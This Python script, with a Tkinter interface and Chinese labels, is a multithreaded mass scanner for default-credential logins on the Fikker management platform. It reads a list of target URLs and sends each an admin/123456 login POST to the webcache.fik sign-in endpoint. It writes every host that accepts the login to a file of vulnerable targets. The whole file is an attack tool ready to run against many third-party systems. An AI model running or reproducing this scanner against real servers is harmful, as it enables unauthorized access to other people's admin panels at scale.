import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def fikker_weak_password_exp(url):
    poc = r"""/fikker/webcache.fik?type=sign&cmd=in"""
    url = url + poc
    headers = {
        "Referer": "http://www.baidu.com/"
    }
    data = r"RequestID=LOGIN&Username=admin&Password=123456"
    try:
        res = requests.post(url, headers=headers,data=data,verify=False,timeout=3)
        if "True" in res.text:
            fikker_weak_password_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            fikker_weak_password_text.see(END)
            with open ("存在Fikker 管理平台弱口令漏洞的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            fikker_weak_password_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            fikker_weak_password_text.see(END)
    except Exception as err:
        fikker_weak_password_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        fikker_weak_password_text.see(END)
def get_fikker_weak_password_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def fikker_weak_password_gui():
    fikker_weak_password = tk.Tk()
    fikker_weak_password.geometry("910x450")
    fikker_weak_password.title("Fikker 管理平台弱口令漏洞一把梭")
    fikker_weak_password.resizable(0, 0)
    fikker_weak_password.iconbitmap('logo.ico')
    global fikker_weak_password_text
    fikker_weak_password_text = scrolledtext.ScrolledText(fikker_weak_password,width=123, height=25)
    fikker_weak_password_text.grid(row=0, column=0, padx=10, pady=10)
    fikker_weak_password_text.see(END)
    addrs = get_fikker_weak_password_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(fikker_weak_password_exp, addr)
    fikker_weak_password.mainloop()